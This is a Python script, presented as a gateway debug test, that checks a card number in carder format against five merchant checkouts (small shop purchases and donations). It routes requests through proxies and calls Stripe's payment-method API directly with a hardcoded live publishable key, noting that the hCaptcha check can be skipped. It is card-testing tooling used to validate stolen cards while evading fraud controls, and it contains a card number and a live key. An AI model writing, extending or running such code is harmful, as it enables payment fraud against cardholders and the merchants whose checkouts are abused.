#!/usr/bin/env python3
"""
Debug script to test all gateways and identify issues
"""

import sys
import time
import traceback
sys.path.insert(0, '100$/100$/')

# Test card
TEST_CARD = "5566258985615466|12|25|299"

print("="*60)
print("GATEWAY DEBUG TEST - ALL GATEWAYS")
print("="*60)
print(f"\nTest Card: {TEST_CARD}")
print("-"*60)

# Test Gateway 1 - Blemart
print("\n[GATEWAY 1] Blemart ($4.99)")
print("-"*40)
try:
    from Charge1 import BlemartCheckout
    start = time.time()
    result = BlemartCheckout(TEST_CARD)
    elapsed = time.time() - start
    print(f"Result: {result}")
    print(f"Time: {elapsed:.2f}s")
except Exception as e:
    print(f"ERROR: {e}")
    traceback.print_exc()

# Test Gateway 2 - District People
print("\n[GATEWAY 2] District People (€69)")
print("-"*40)
try:
    from Charge2 import DistrictPeopleCheckout
    start = time.time()
    result = DistrictPeopleCheckout(TEST_CARD)
    elapsed = time.time() - start
    print(f"Result: {result}")
    print(f"Time: {elapsed:.2f}s")
except Exception as e:
    print(f"ERROR: {e}")
    traceback.print_exc()

# Test Gateway 3 - Saint Vinson
print("\n[GATEWAY 3] Saint Vinson ($20)")
print("-"*40)
try:
    from Charge3 import SaintVinsonDonateCheckout
    start = time.time()
    result = SaintVinsonDonateCheckout(TEST_CARD)
    elapsed = time.time() - start
    print(f"Result: {result}")
    print(f"Time: {elapsed:.2f}s")
except Exception as e:
    print(f"ERROR: {e}")
    traceback.print_exc()

# Test Gateway 4 - BGD Fresh
print("\n[GATEWAY 4] BGD Fresh ($6.50)")
print("-"*40)
try:
    from Charge4 import BGDCheckoutLogic
    start = time.time()
    result = BGDCheckoutLogic(TEST_CARD)
    elapsed = time.time() - start
    print(f"Result: {result}")
    print(f"Time: {elapsed:.2f}s")
except Exception as e:
    print(f"ERROR: {e}")
    traceback.print_exc()

# Test Gateway 5 - Staleks (Current Focus)
print("\n[GATEWAY 5] Staleks ($1.00) - PRIORITY")
print("-"*40)
try:
    from Charge5 import StaleksFloridaCheckoutVNew
    start = time.time()
    result = StaleksFloridaCheckoutVNew(TEST_CARD)
    elapsed = time.time() - start
    print(f"Result: {result}")
    print(f"Time: {elapsed:.2f}s")
    
    # Test with proxy if available
    print("\nTesting with proxy...")
    try:
        with open('/home/null/Documents/usetheseproxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                proxy = proxies[0]
                print(f"Using proxy: {proxy[:30]}...")
                start = time.time()
                result = StaleksFloridaCheckoutVNew(TEST_CARD, proxy=proxy)
                elapsed = time.time() - start
                print(f"Result with proxy: {result}")
                print(f"Time: {elapsed:.2f}s")
    except:
        print("No proxy test (file not found or error)")
        
except Exception as e:
    print(f"ERROR: {e}")
    traceback.print_exc()

print("\n" + "="*60)
print("DEBUG TEST COMPLETE")
print("="*60)

# Now let's check what the actual issue is with Gateway 5
print("\n[DETAILED DEBUG - GATEWAY 5]")
print("-"*40)

try:
    import requests
    
    # Test the exact mady.py approach step by step
    print("\n1. Testing Stripe PM creation...")
    
    n, mm, yy, cvc = TEST_CARD.split('|')
    if len(yy) == 4:
        yy = yy[2:]
    
    pm_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    # Try without hcaptcha first
    pm_data_simple = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
    
    print("   Testing without hcaptcha token...")
    resp = requests.post('https://api.stripe.com/v1/payment_methods', 
                         headers=pm_headers, data=pm_data_simple, timeout=10)
    
    if resp.status_code == 200:
        pm_json = resp.json()
        if 'id' in pm_json:
            print(f"   ✓ PM created: {pm_json['id']}")
            print("   Note: Works without hcaptcha!")
        elif 'error' in pm_json:
            print(f"   ✗ Error: {pm_json['error'].get('message', 'Unknown')}")
    else:
        print(f"   ✗ HTTP {resp.status_code}")
        
except Exception as e:
    print(f"Debug error: {e}")

print("\n[END OF DEBUG]")
